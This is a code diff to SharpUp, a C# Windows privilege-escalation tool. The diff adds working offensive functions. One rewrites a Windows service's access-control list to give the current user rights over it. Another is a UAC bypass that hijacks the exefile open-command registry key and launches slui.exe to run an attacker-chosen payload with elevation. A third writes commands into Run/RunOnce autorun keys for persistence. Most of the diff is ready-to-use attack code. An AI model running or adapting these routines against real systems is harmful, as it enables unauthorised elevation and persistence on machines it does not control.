@@ -1,4 +1,4 @@
-using System;
+﻿using System;
 using System.Collections;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -16,10 +16,10 @@ using System.Security.Principal;
 using System.ServiceProcess;
 using System.Text;
 using System.Text.RegularExpressions;
-using System.Xml;
 using Microsoft.Win32;
+using System.Xml;
 using System.Security.Cryptography;
-
+using System.Threading;
 
 namespace SharpUp
 {
@@ -55,6 +55,8 @@ namespace SharpUp
             uint bufSize,
             out uint bufSizeNeeded);
 
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool SetServiceObjectSecurity(SafeHandle serviceHandle, System.Security.AccessControl.SecurityInfos secInfos, byte[] lpSecDesrBuf);
 
         // PInvoke structures/contants
         public const uint SE_GROUP_LOGON_ID = 0xC0000000; // from winnt.h
@@ -388,6 +390,7 @@ namespace SharpUp
                 {
                     AuthorizationRuleCollection rules = Directory.GetAccessControl(candidatePath).GetAccessRules(true, true, typeof(System.Security.Principal.SecurityIdentifier));
                     WindowsIdentity identity = WindowsIdentity.GetCurrent();
+                    bool accessAllowed = false;
 
                     foreach (FileSystemAccessRule rule in rules)
                     {
@@ -398,10 +401,17 @@ namespace SharpUp
                                 if ((AccessRight & rule.FileSystemRights) == AccessRight)
                                 {
                                     if (rule.AccessControlType == AccessControlType.Allow)
-                                        return true;
+                                    {
+
+                                        System.Console.WriteLine("Allowed Right: " + AccessRight);
+                                        accessAllowed = true; 
+                                    }
                                 }
                             }
                         }
+                    }
+                    if (accessAllowed){
+                        return true; 
                     }
                 }
                 return false;
@@ -467,6 +477,7 @@ namespace SharpUp
                             Console.WriteLine("  State            : {0}", result["State"]);
                             Console.WriteLine("  StartMode        : {0}", result["StartMode"]);
                             Console.WriteLine("  PathName         : {0}", result["PathName"]);
+                            Console.WriteLine();
                         }
                     }
                 }
@@ -591,6 +602,124 @@ namespace SharpUp
             }
         }
 
+        public static void WriteServiceDacl(string name)
+        {
+            ServiceController[] scServices;
+            scServices = ServiceController.GetServices();
+            var GetServiceHandle = typeof(System.ServiceProcess.ServiceController).GetMethod("GetServiceHandle", BindingFlags.Instance | BindingFlags.NonPublic);
+
+            object[] readRights = { 0x00020000 };
+
+            ServiceAccessRights[] ModifyRights =
+               {
+                ServiceAccessRights.ChangeConfig,
+                ServiceAccessRights.WriteDac,
+                ServiceAccessRights.WriteOwner,
+                ServiceAccessRights.GenericAll,
+                ServiceAccessRights.GenericWrite,
+                ServiceAccessRights.AllAccess
+            };
+
+            foreach (ServiceController sc in scServices)
+            {
+                if (sc.ServiceName == name)
+                {
+                    Console.WriteLine("Adjusting service: " + sc.ServiceName);
+                    try
+                    {
+                        IntPtr handle = (IntPtr)GetServiceHandle.Invoke(sc, readRights);
+                        ServiceControllerStatus status = sc.Status;
+                        byte[] psd = new byte[0];
+                        uint bufSizeNeeded;
+                        bool ok = QueryServiceObjectSecurity(handle, SecurityInfos.DiscretionaryAcl, psd, 0, out bufSizeNeeded);
+                  
+                        if (!ok)
+                        {
+                            int err = Marshal.GetLastWin32Error();
+                            if (err == 122 || err == 0)
+                            { // ERROR_INSUFFICIENT_BUFFER
+                              // expected; now we know bufsize
+                                psd = new byte[bufSizeNeeded];
+                                ok = QueryServiceObjectSecurity(handle, SecurityInfos.DiscretionaryAcl, psd, bufSizeNeeded, out bufSizeNeeded);
+                            }
+                            else
+                            {
+                                //throw new ApplicationException("error calling QueryServiceObjectSecurity() to get DACL for " + _name + ": error code=" + err);
+                                continue;
+                            }
+                        }
+                        if (!ok)
+                        {
+                            //throw new ApplicationException("error calling QueryServiceObjectSecurity(2) to get DACL for " + _name + ": error code=" + Marshal.GetLastWin32Error());
+                            continue;
+                        }
+
+                        // get security descriptor via raw into DACL form so ACE ordering checks are done for us.
+                        RawSecurityDescriptor rsd = new RawSecurityDescriptor(psd, 0);
+                        RawAcl racl = rsd.DiscretionaryAcl;
+                        DiscretionaryAcl dacl = new DiscretionaryAcl(false, false, racl);
+
+
+                        WindowsIdentity identity = WindowsIdentity.GetCurrent();
+
+                        foreach (System.Security.AccessControl.CommonAce ace in dacl)
+                        {
+
+                            if (identity.Groups.Contains(ace.SecurityIdentifier))
+                            {
+                                Console.WriteLine("DACL for SID: " + ace.SecurityIdentifier);
+                                Console.WriteLine(ace.AccessMask);
+                                Console.WriteLine(ace.AceType);
+                                bool accessAllowed = false;
+                                ServiceAccessRights serviceRights = (ServiceAccessRights)ace.AccessMask;
+
+
+
+                                foreach (ServiceAccessRights ModifyRight in ModifyRights)
+                                {
+
+                                    if ((ModifyRight & serviceRights) == ModifyRight)
+                                    {
+                                        System.Console.WriteLine("We have access, doing it....");
+                                        dacl.AddAccess(AccessControlType.Allow, ace.SecurityIdentifier, 1,
+                                                       InheritanceFlags.None, PropagationFlags.None);
+
+                                        byte[] rawdacl = new byte[dacl.BinaryLength];
+                                        dacl.GetBinaryForm(rawdacl, 0);
+                                        rsd.DiscretionaryAcl = new RawAcl(rawdacl, 0);
+
+                                        byte[] rawsd = new byte[rsd.BinaryLength];
+                                        rsd.GetBinaryForm(rawsd, 0);
+                                        try
+                                        {
+                                            ok = SetServiceObjectSecurity(sc.ServiceHandle, SecurityInfos.DiscretionaryAcl, rawsd);
+                                            if (!ok)
+                                            {
+
+                                                throw new ApplicationException("error calling SetServiceObjectSecurity(); error code=" + Marshal.GetLastWin32Error());
+                                            }
+                                            return;
+                                        }
+                                        catch (Exception ex)
+                                        {
+                                            Console.WriteLine("Exception: " + ex);
+                                            Console.WriteLine("Trying other DACLs");
+                                        }
+                                    }
+                                }
+                                
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("Exception: " + ex);
+                    }
+                }
+            }
+
+        }
+
         public static void GetModifiableServices()
         {
             // finds any services that the current can modify (or modify the parent folder)
@@ -658,24 +787,43 @@ namespace SharpUp
                     {
                         if (identity.Groups.Contains(ace.SecurityIdentifier))
                         {
+
+                            bool accessAllowed = false;
+                            List<ServiceAccessRights> accessesAllowed = new List<ServiceAccessRights>();
                             ServiceAccessRights serviceRights = (ServiceAccessRights)ace.AccessMask;
                             foreach (ServiceAccessRights ModifyRight in ModifyRights)
                             {
+
                                 if ((ModifyRight & serviceRights) == ModifyRight)
                                 {
-                                    ManagementObjectSearcher wmiData = new ManagementObjectSearcher(@"root\cimv2", String.Format("SELECT * FROM win32_service WHERE Name LIKE '{0}'", sc.ServiceName));
-                                    ManagementObjectCollection data = wmiData.Get();
+                                    accessesAllowed.Add(ModifyRight);
+                                    accessAllowed = true;
 
-                                    foreach (ManagementObject result in data)
+                                }
+                            }
+                            if (accessAllowed)
+
+                            {
+                                ManagementObjectSearcher wmiData = new ManagementObjectSearcher(@"root\cimv2", String.Format("SELECT * FROM win32_service WHERE Name LIKE '{0}'", sc.ServiceName));
+                                ManagementObjectCollection data = wmiData.Get();
+
+                                foreach (ManagementObject result in data)
+                                {
+                                    Console.WriteLine("  Name             : {0}", result["Name"]);
+                                    Console.WriteLine("  DisplayName      : {0}", result["DisplayName"]);
+                                    Console.WriteLine("  Description      : {0}", result["Description"]);
+                                    Console.WriteLine("  State            : {0}", result["State"]);
+                                    Console.WriteLine("  StartMode        : {0}", result["StartMode"]);
+                                    Console.WriteLine("  PathName         : {0}", result["PathName"]);
+                                    Console.WriteLine("  SID of DACL      : {0}", ace.SecurityIdentifier);
+                                    Console.WriteLine("  ACE Type         : {0}", ace.AceType);
+                                    Console.WriteLine("Allowed Modify Rights:");
+                                    foreach (ServiceAccessRights modifyRight in accessesAllowed)
                                     {
-                                        Console.WriteLine("  Name             : {0}", result["Name"]);
-                                        Console.WriteLine("  DisplayName      : {0}", result["DisplayName"]);
-                                        Console.WriteLine("  Description      : {0}", result["Description"]);
-                                        Console.WriteLine("  State            : {0}", result["State"]);
-                                        Console.WriteLine("  StartMode        : {0}", result["StartMode"]);
-                                        Console.WriteLine("  PathName         : {0}", result["PathName"]);
+                                        System.Console.WriteLine(modifyRight);
                                     }
-                                    break;
+                                    System.Console.WriteLine();
+
                                 }
                             }
                         }
@@ -707,7 +855,7 @@ namespace SharpUp
                     String.Format("{0}\\System32\\Sysprep\\unattend.xml", windir),
                     String.Format("{0}\\System32\\Sysprep\\Panther\\unattend.xml", windir)
                 };
-                
+
                 foreach (string SearchLocation in SearchLocations)
                 {
                     if (System.IO.File.Exists(SearchLocation))
@@ -1018,7 +1166,7 @@ namespace SharpUp
 
             return System.Text.UnicodeEncoding.Unicode.GetString(outBlock);
         }
-
+        
         public static void PrivescChecks(bool auditMode)
         {
             bool isHighIntegrity = IsHighIntegrity();
@@ -1049,8 +1197,8 @@ namespace SharpUp
                     // except if auditMode has explictly been asked
                     Console.WriteLine("\r\n[*] Audit mode: running all checks anyway.");
                 }
-            }
 
+            }
             GetModifiableServices();
             GetModifiableServiceBinaries();
             GetAlwaysInstallElevated();
@@ -1061,20 +1209,212 @@ namespace SharpUp
             GetMcAfeeSitelistFiles();
             GetCachedGPPPassword();
         }
+        
+
+
+        //https://bytecode77.com/hacking/exploits/uac-bypass/slui-file-handler-hijack-privilege-escalation
+        static void UacBypass_SLUI(string filename)
+        {
+            RegistryKey rkApp = Registry.CurrentUser.CreateSubKey("Software").CreateSubKey("Classes").CreateSubKey("exefile").CreateSubKey("shell").CreateSubKey("open").CreateSubKey("command");
+
+            rkApp.SetValue("", filename);
+
+            var startInfo = new ProcessStartInfo("C:\\Windows\\System32\\slui.exe");
+            startInfo.Verb = "runas";
+            Process.Start(startInfo);
+
+            Thread.Sleep(1000);
+            DeleteRegistryKey("CurrentUser", "Software\\Classes\\exefile\\shell\\open\\command");
+            DeleteRegistryKey("CurrentUser", "Software\\Classes\\exefile\\shell\\open");
+   
+
+        }
+
+        static void DeleteRegistryKey(string hiveBase, string subKey)
+        {
+            if (string.Equals(hiveBase, "CurrentUser", StringComparison.CurrentCultureIgnoreCase))
+            {
+                Registry.CurrentUser.DeleteSubKey(subKey);
+
+            }
+            else if (string.Equals(hiveBase, "LocalMachine", StringComparison.CurrentCultureIgnoreCase))
+            {
+
+                Registry.LocalMachine.DeleteSubKey(subKey);
+
+
+            }
+        }
+
+        static void DeleteRegistryValue(string hiveBase, string subKey, string name)
+        {
+            if (string.Equals(hiveBase, "CurrentUser", StringComparison.CurrentCultureIgnoreCase))
+            {
+                RegistryKey rkApp = Registry.CurrentUser.OpenSubKey(subKey, true);
+                rkApp.DeleteValue(name);
+            }
+            else if (string.Equals(hiveBase, "LocalMachine", StringComparison.CurrentCultureIgnoreCase))
+            {
+
+                RegistryKey rkApp = Registry.LocalMachine.OpenSubKey(subKey, true);
+                rkApp.DeleteValue(name);
+
+
+            }
+        }
+
+
+        static void WriteRegistry(string hiveBase, string subKey, string name, string command)
+        {
+
+            if (string.Equals(hiveBase, "CurrentUser", StringComparison.CurrentCultureIgnoreCase))
+            {
+                RegistryKey rkApp = Registry.CurrentUser.OpenSubKey(subKey, true);
+                rkApp.SetValue(name, command);
+
+            }
+            else if (string.Equals(hiveBase, "LocalMachine", StringComparison.CurrentCultureIgnoreCase))
+            {
+
+                RegistryKey rkApp = Registry.LocalMachine.OpenSubKey(subKey, true);
+                rkApp.SetValue(name, command);
+
+            }
+
+        }
+
+        public static void ListAutoruns()
+        {
+            Console.WriteLine("\r\n\r\n=== All Registry Autoruns ===\r\n");
+
+            string[] autorunLocations = new string[] {
+                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+                "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
+                "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunService",
+                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceService",
+                "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunService",
+
+
+
+            };
+
+            string[] hives = new string[] { "HKLM", "HKCU" };
+
+            foreach (string hive in hives)
+            {
+                foreach (string autorunLocation in autorunLocations)
+                {
+                    Dictionary<string, object> settings = GetRegValues(hive, autorunLocation);
+                    if ((settings != null) && (settings.Count != 0))
+                    {
+                        foreach (KeyValuePair<string, object> kvp in settings)
+                        {
+                           
+                             
+                            Console.WriteLine(String.Format("  {3}:\\{0}\\{1} : {2}", autorunLocation,kvp.Key,kvp.Value,hive));
+
+                        }
+                    }
+                }
+            }
+        }
+
 
         static void Main(string[] args)
         {
             bool auditMode = args.Contains("audit", StringComparer.CurrentCultureIgnoreCase);
 
-            var watch = System.Diagnostics.Stopwatch.StartNew();
+            if (args.Contains("WriteDacl", StringComparer.CurrentCultureIgnoreCase))
+            {
+                if (args.Length == 2)
+                {
+                    //adds current users sid to the service
+                    WriteServiceDacl(args[1]);
 
-            Console.WriteLine("\r\n=== SharpUp: Running Privilege Escalation Checks ===");
+                }
+                else
+                {
+                    System.Console.WriteLine("Usage: SharpView.exe WriteDacl <service>");
 
-            PrivescChecks(auditMode);
+                }
+            }
+            else if (args.Contains("WriteRegistry", StringComparer.CurrentCultureIgnoreCase))
+            {
 
-            watch.Stop();
-            Console.WriteLine(String.Format("\r\n\r\n[*] Completed Privesc Checks in {0} seconds\r\n", watch.ElapsedMilliseconds / 1000));
+                foreach (string arg in args)
+                {
+                    System.Console.WriteLine(arg);
+                }
+
+                if (args.Length == 5)
+                {
+                    WriteRegistry(hiveBase: args[1], subKey: args[2], name: args[3], command: args[4]);
+                }
+                else
+                {
+                    System.Console.WriteLine("USage: SharpUp.exe WriteRegistryAutorun <CurrentUser|LocalMachine> <subkey> <name> <command>");
+                    System.Console.WriteLine("======Hint: Local Machine AutoRun Locations=====");
+               
+
+                    string[] autorunLocations = new string[] {
+                        @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                        @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+                        @"SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
+                        @"SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+                        @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunService",
+                        @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceService",
+                        @"SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunService",
+                        @"SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnceService"
+                    };
+                    foreach (string autorunlocation in autorunLocations)
+                    {
+                        System.Console.WriteLine(autorunlocation);
+                    }
+                }
+            }
+              else if (args.Contains("ListAutoruns", StringComparer.CurrentCultureIgnoreCase))
+            {
+                ListAutoruns();
+            }
+            else if (args.Contains("DeleteRegistryValue", StringComparer.CurrentCultureIgnoreCase))
+            {
+                if (args.Length == 4)
+                {
+                    DeleteRegistryValue(hiveBase: args[1], subKey: args[2], name: args[3]);
+                }
+                else
+                {
+                    System.Console.WriteLine("USage: SharpView.exe DeleteRegistryValue <CurrentUser|LocalMachine> <subkey> <name>");
+
+                }
+            }
+            else if (args.Contains("uac_slui", StringComparer.CurrentCultureIgnoreCase))
+            {
+                if (args.Length == 2)
+                {
+                    UacBypass_SLUI(filename: args[1]);
+                }
+                else
+                {
+                    System.Console.WriteLine("USage: SharpView.exe uac_slui <payload.exe>");
+
+                }
+            }
+            else
+            {
+
+
+                var watch = System.Diagnostics.Stopwatch.StartNew();
+
+                Console.WriteLine("\r\n=== SharpUp: Running Privilege Escalation Checks ===");
+
+                PrivescChecks(auditMode);
+
+                watch.Stop();
+                Console.WriteLine(String.Format("\r\n\r\n[*] Completed Privesc Checks in {0} seconds\r\n", watch.ElapsedMilliseconds / 1000));
+            }
         }
     }
 }
-
